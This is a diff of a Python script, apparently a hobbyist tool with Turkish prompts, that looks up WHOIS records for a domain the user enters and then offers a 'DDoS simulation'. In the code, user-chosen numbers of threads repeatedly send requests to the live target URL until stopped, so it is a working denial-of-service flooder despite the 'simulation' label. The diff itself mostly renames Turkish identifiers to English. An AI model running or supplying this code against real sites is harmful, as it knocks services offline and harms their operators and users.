@@ -2,15 +2,15 @@ import whois
 import threading
 import requests
 
-# Global deðiþken saldýrýyý durdurmak için
+# Global degisken saldiriya son vermek icin
 ddos_running = True
 
-def whois_sorgusu(domain_name):
+def whois_query(domain_name):
     """Whois sorgusu yapar ve bilgileri ekrana yazar."""
     try:
         domain_info = whois.whois(domain_name)
         print("\nWhois Bilgileri:")
-        print("-----------------")
+        print("-------------------")
         print("Domain Adi:", domain_info.domain_name)
         print("Kayitci:", domain_info.registrar)
         print("Olusturulma Tarihi:", domain_info.creation_date)
@@ -20,9 +20,9 @@ def whois_sorgusu(domain_name):
     except Exception as e:
         print(f"Whois sorgusu basarisiz: {e}")
 
-def ddos_saldirisi(target_url, thread_count):
-    """DDoS saldýrýsýný simüle eder."""
-    def istek_gonder():
+def ddos_attack(target_url, thread_count):
+    """DDoS saldirisini simule eder."""
+    def send_request():
         global ddos_running
         try:
             while ddos_running:
@@ -31,27 +31,27 @@ def ddos_saldirisi(target_url, thread_count):
         except Exception as e:
             print(f"Hata: {e}")
     
-    # Kullanýcýdan durdurma sinyali için bir thread baþlat
-    def durdurma_mechanizmasi():
+    # Kullaniciya saldiriya son verme mekanizmasi
+    def stop_mechanism():
         global ddos_running
-        input("\nDDoS saldýrýsýný durdurmak için ENTER'a basýn...\n")
+        input("\nDDoS saldirisini durdurmak icin ENTER'a basiniz...\n")
         ddos_running = False
 
-    # Threadler baþlatýlýyor
+    # Threadler baslatiliyor
     threads = []
 
-    # Durdurma thread'i
-    durdurma_thread = threading.Thread(target=durdurma_mechanizmasi)
-    threads.append(durdurma_thread)
-    durdurma_thread.start()
+    # Durma thread'i
+    stop_thread = threading.Thread(target=stop_mechanism)
+    threads.append(stop_thread)
+    stop_thread.start()
 
-    # Ýstek gönderme thread'leri
+    # Istek gonderme thread'leri
     for i in range(thread_count):
-        thread = threading.Thread(target=istek_gonder)
+        thread = threading.Thread(target=send_request)
         threads.append(thread)
         thread.start()
 
-    # Tüm thread'lerin tamamlanmasýný bekle
+    # Tum thread'lerin tamamlanmasi bekleniyor
     for thread in threads:
         thread.join()
 
@@ -59,17 +59,17 @@ if __name__ == "__main__":
     print("=== Whois ve DDoS Simulasyonu ===")
     domain = input("Lutfen bir domain adi giriniz (ornek: example.com): ")
 
-    # Whois sorgusu yap
-    whois_sorgusu(domain)
+    # Whois sorgusu yapiliyor
+    whois_query(domain)
 
-    # Kullaniciya DDoS yapmak isteyip istemedigini sor
-    secim = input("\nBu domain icin DDoS/DOS simulasyonu yapmak istiyor musunuz? (Evet/Hayir): ").strip().lower()
-    if secim in ["evet", "e", "yes", "y"]:
-        hedef_url = f"http://{domain}"
+    # Kullaniciya DDoS yapmak isteyip istemedigini soruyor
+    choice = input("\nBu domain icin DDoS/DOS simulasyonu yapmak istiyor musunuz? (Evet/Hayir): ").strip().lower()
+    if choice in ["evet", "e", "yes", "y"]:
+        target_url = f"http://{domain}"
         try:
             thread_count = int(input("Kac is parcacigi calistirmak istiyorsunuz? (Ornek: 10-50): "))
-            print(f"{hedef_url} adresine DDoS simulasyonu baslatiliyor...")
-            ddos_saldirisi(hedef_url, thread_count)
+            print(f"{target_url} adresine DDoS simulasyonu baslatiliyor...")
+            ddos_attack(target_url, thread_count)
         except Exception as e:
             print(f"Hata: {e}")
     else:
